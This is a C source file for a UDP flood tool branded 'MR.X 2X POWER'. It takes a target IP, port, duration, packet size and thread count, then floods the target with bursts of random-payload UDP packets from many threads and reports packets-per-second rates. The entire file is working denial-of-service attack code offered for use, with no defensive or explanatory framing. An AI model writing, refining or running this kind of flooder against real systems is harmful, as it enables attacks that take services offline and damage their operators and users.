#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/time.h>

#define HYPER_LOOPS 480
#define INNER_LOOPS 240
#define EXTRA_BURST 48
#define BUFFER_ROTATION 3
#define PRE_ALLOC_COUNT 50000

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
pthread_t monitor_thread;
int monitor_running = 1;

char **packet_pool = NULL;
int pool_index = 0;

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        for(int j = 0; j < PACKET_SIZE; j++) {
            packet_pool[i][j] = rand() % 256;
        }
        mlock(packet_pool[i], PACKET_SIZE);
    }
}

void cleanup_pool() {
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        if(packet_pool[i]) free(packet_pool[i]);
    }
    free(packet_pool);
}

void *pps_monitor(void *arg) {
    unsigned long long prev_count = 0;
    unsigned long long peak_pps = 0;
    
    while (monitor_running) {
        sleep(1);
        unsigned long long current_count = total_packets;
        unsigned long long pps = current_count - prev_count;
        prev_count = current_count;
        
        if (pps > peak_pps) peak_pps = pps;
        unsigned long long pps_k = pps / 1000;
        if (pps_k == 0 && pps > 0) pps_k = 1;
        
        fprintf(stderr, "%lluK|P:%lluK\n", pps_k, peak_pps/1000);
        fflush(stderr);
    }
    return NULL;
}

void *send_hyper_packets(void *arg) {
    int socks[BUFFER_ROTATION];
    struct sockaddr_in servaddr;
    time_t start_time = time(NULL);
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        int broadcast = 1;
        int sndbuf = 200 * 1024 * 1024;
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
    }
    
    int local_pool_index = (int)(long)arg % PRE_ALLOC_COUNT;
    int socket_rotate = 0;
    
    while (time(NULL) - start_time < DURATION_TIME) {
        for (int mega_burst = 0; mega_burst < HYPER_LOOPS; mega_burst++) {
            int current_sock = socks[socket_rotate % BUFFER_ROTATION];
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE, 
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            __sync_fetch_and_add(&total_packets, 1);
            
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            __sync_fetch_and_add(&total_packets, 1);
            
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            for (int i = 0; i < INNER_LOOPS; i++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
            
            for (int extra = 0; extra < EXTRA_BURST; extra++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
        }
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        close(socks[s]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
        exit(EXIT_FAILURE);
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Error: Invalid values\n");
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "💣 MR.X 2X POWER 🔥Started🔥\n");
    fflush(stderr);
    
    srand(time(NULL));
    init_packet_pool();

    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    if (threads == NULL) {
        fprintf(stderr, "Memory failed\n");
        return EXIT_FAILURE;
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_hyper_packets, (void*)(long)i) != 0) {
            break;
        }
        usleep(500);
    }

    sleep(DURATION_TIME);
    monitor_running = 0;
    
    for (int j = 0; j < THREAD_COUNT; j++) {
        pthread_cancel(threads[j]);
        pthread_join(threads[j], NULL);
    }

    pthread_join(monitor_thread, NULL);
    cleanup_pool();
    free(threads);
    
    unsigned long long avg_pps = total_packets / DURATION_TIME;
    fprintf(stderr, "🟢 MR.X 2X Completed ⚡️\n");
    fprintf(stderr, "DONE|%lluKavg|%llupackets\n", avg_pps/1000, total_packets);
    fflush(stderr);

    return 0;
}